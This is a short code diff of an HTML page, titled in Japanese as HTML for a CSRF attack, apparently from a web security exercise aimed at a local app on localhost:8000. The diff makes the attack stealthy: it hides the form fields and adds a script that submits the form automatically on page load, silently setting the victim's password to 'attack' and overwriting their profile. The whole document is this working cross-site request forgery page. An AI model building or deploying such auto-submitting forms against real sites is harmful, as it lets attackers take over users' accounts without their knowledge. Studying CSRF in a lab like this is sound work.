@@ -5,19 +5,15 @@
     <title>CSRF攻撃用HTML</title>
   </head>
   <body>
-    <form action="http://localhost:8000/update" method="post">
-      <table>
-        <tr>
-          <th>パスワード</th><td><input type="text" id="password" name="password" value="attack" required /></td>
-        </tr>
-        <tr>
-          <th>プロフィール</th><td><input type="textarea" id="profile" name="profile" value="CSRF攻撃で書き換えた" /></td>
-        </tr>
-      </table>
-      <div>
-        <input type="submit" id="register" name="register" value="更新"/>
-      </div>
+    <form id="attackForm" action="http://localhost:8000/update" method="post">
+      <input type="hidden" id="password" name="password" value="attack"/></td>
+      <input type="hidden" id="profile" name="profile" value="CSRF攻撃で書き換えた"/></td>
     </form>
+    <script>
+      window.onload = function(){
+        document.getElementById("attackForm").submit();
+      };
+    </script>
   </body>
 </html>
 
